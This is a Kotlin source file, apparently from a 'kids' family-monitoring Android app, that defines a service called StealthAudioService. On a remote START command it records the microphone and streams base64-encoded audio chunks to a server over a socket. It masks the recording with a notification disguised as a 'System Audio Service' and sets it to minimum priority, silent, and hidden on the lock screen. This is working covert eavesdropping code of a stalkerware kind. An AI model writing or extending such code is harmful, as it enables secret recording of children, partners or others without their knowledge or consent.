package com.xixfamily.kids.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.os.Build
import android.os.IBinder
import android.util.Base64
import android.util.Log
import androidx.core.app.NotificationCompat
import com.xixfamily.kids.R
import com.xixfamily.kids.network.SocketManager
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.text.SimpleDateFormat
import java.util.*

class StealthAudioService : Service() {

    companion object {
        private const val TAG = "StealthAudio"
        private const val CHANNEL_ID = "stealth_audio_channel"
        private const val NOTIF_ID = 9004

        private const val SAMPLE_RATE = 16000
        private const val CHUNK_MS = 3000L // 3 second chunks
        private const val BUFFER_SIZE = 4096

        var isRecording = false
            private set
        var currentSessionId: String? = null
            private set
    }

    private var audioRecord: AudioRecord? = null
    private var recordingThread: Thread? = null
    private var sequenceNumber = 0
    private var maxDurationMs = 60000L // default 60 seconds

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        Log.d(TAG, "StealthAudioService created")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            "START" -> {
                val sessionId = intent.getStringExtra("sessionId") ?: return START_STICKY
                maxDurationMs = intent.getLongExtra("duration", 60000)
                startStealthRecording(sessionId)
            }
            "STOP" -> {
                stopStealthRecording()
                stopSelf()
            }
        }
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        stopStealthRecording()
        super.onDestroy()
    }

    private fun startStealthRecording(sessionId: String) {
        if (isRecording) return

        currentSessionId = sessionId
        sequenceNumber = 0
        isRecording = true

        // Use subtle notification that looks like a system service
        val notification = createStealthNotification()
        startForeground(NOTIF_ID, notification)

        recordingThread = Thread {
            try {
                val minBufferSize = AudioRecord.getMinBufferSize(
                    SAMPLE_RATE,
                    AudioFormat.CHANNEL_IN_MONO,
                    AudioFormat.ENCODING_PCM_16BIT
                )

                audioRecord = AudioRecord(
                    MediaRecorder.AudioSource.MIC,
                    SAMPLE_RATE,
                    AudioFormat.CHANNEL_IN_MONO,
                    AudioFormat.ENCODING_PCM_16BIT,
                    maxOf(minBufferSize, BUFFER_SIZE)
                )

                if (audioRecord?.state != AudioRecord.STATE_INITIALIZED) {
                    Log.e(TAG, "AudioRecord init failed")
                    SocketManager.getInstance().emit("audio:stealth:stopped", JSONObject().apply {
                        put("sessionId", sessionId)
                    })
                    isRecording = false
                    return@Thread
                }

                audioRecord?.startRecording()
                Log.d(TAG, "Stealth audio started for session $sessionId")

                val buffer = ByteArray(BUFFER_SIZE)
                val chunkBuffer = ByteArrayOutputStream()
                val startTime = System.currentTimeMillis()

                while (isRecording && !Thread.currentThread().isInterrupted) {
                    // Check duration limit
                    if (maxDurationMs > 0 && System.currentTimeMillis() - startTime > maxDurationMs) {
                        Log.d(TAG, "Stealth audio max duration reached")
                        break
                    }

                    val bytesRead = audioRecord?.read(buffer, 0, buffer.size) ?: -1
                    if (bytesRead > 0) {
                        chunkBuffer.write(buffer, 0, bytesRead)
                        val chunkSize = (SAMPLE_RATE * 2 * CHUNK_MS / 1000).toInt()
                        if (chunkBuffer.size() >= chunkSize) {
                            sendAudioChunk(sessionId, chunkBuffer.toByteArray())
                            chunkBuffer.reset()
                        }
                    }
                }

                if (chunkBuffer.size() > 0) {
                    sendAudioChunk(sessionId, chunkBuffer.toByteArray())
                }

            } catch (e: Exception) {
                Log.e(TAG, "Recording error: ${e.message}")
            } finally {
                try {
                    audioRecord?.stop()
                    audioRecord?.release()
                    audioRecord = null
                } catch (_: Exception) {}

                // Notify server
                SocketManager.getInstance().emit("audio:stealth:stopped", JSONObject().apply {
                    put("sessionId", sessionId)
                })
            }
        }

        recordingThread?.start()
    }

    private fun stopStealthRecording() {
        isRecording = false
        currentSessionId = null
        recordingThread?.interrupt()
        recordingThread = null

        try {
            audioRecord?.stop()
            audioRecord?.release()
            audioRecord = null
        } catch (_: Exception) {}

        val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
        nm.cancel(NOTIF_ID)

        Log.d(TAG, "Stealth audio stopped")
    }

    private fun sendAudioChunk(sessionId: String, pcmData: ByteArray) {
        if (!SocketManager.getInstance().isSocketConnected()) return

        try {
            val audioBase64 = Base64.encodeToString(pcmData, Base64.NO_WRAP)
            SocketManager.getInstance().emit("audio:stealth:frame", JSONObject().apply {
                put("sessionId", sessionId)
                put("audioBase64", audioBase64)
                put("sequence", sequenceNumber++)
                put("duration", CHUNK_MS)
                put("timestamp", SimpleDateFormat(
                    "yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US
                ).apply { timeZone = TimeZone.getTimeZone("UTC") }.format(Date()))
            })
        } catch (e: Exception) {
            Log.e(TAG, "Error sending audio chunk: ${e.message}")
        }
    }

    private fun createStealthNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Audio Service")
            .setContentText("Audio optimization active")
            .setSmallIcon(android.R.drawable.ic_btn_speak_now)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setSilent(true)
            .setShowWhen(false)
            .setLocalOnly(true)
            .build()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Audio",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "System audio service"
                setShowBadge(false)
                lockscreenVisibility = NotificationCompat.VISIBILITY_SECRET
            }
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(channel)
        }
    }
}
